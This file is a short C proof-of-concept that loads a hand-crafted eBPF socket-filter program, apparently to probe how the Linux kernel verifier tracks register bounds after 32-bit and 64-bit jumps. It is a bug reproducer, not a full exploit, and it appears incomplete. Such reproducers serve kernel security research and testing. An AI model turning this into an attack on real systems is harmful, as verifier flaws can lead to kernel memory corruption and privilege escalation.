#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <linux/bpf.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <stddef.h>
#include "bpf_insn.h"

#define BPF_LOG_BUF_SIZE (0xFFFFFFFF >> 8)

char bpf_log_buf[BPF_LOG_BUF_SIZE];

static int poc(void)
{
	int sock = -1, map_fd, prog_fd, i, key;
	long long value = 0;

	map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(key), sizeof(value),
				256, 0);
	if (map_fd < 0) {
		printf("failed to create map '%s'\n", strerror(errno));
		goto cleanup;
	}

	struct bpf_insn prog[] = {
		BPF_JMP_IMM(BPF_JGE, BPF_REG_2, 1, 1),
        	BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0),
        	BPF_JMP32_IMM(BPF_JNE, BPF_REG_2, 5, 1),
        	BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0),
        	BPF_ALU64_IMM(BPF_AND, BPF_REG_2, 2),
        	BPF_ALU64_IMM(BPF_RSH, BPF_REG_2, 1),
	};
	size_t insns_cnt = sizeof(prog) / sizeof(struct bpf_insn);

	prog_fd = bpf_load_program(BPF_PROG_TYPE_SOCKET_FILTER, prog, insns_cnt,
				   "GPL", 0, bpf_log_buf, BPF_LOG_BUF_SIZE);
	if (prog_fd < 0) {
		printf("failed to load prog '%s'\n", strerror(errno));
		goto cleanup;
	}


cleanup:
	return 0;
}

int main(void)
{
	return poc();
}
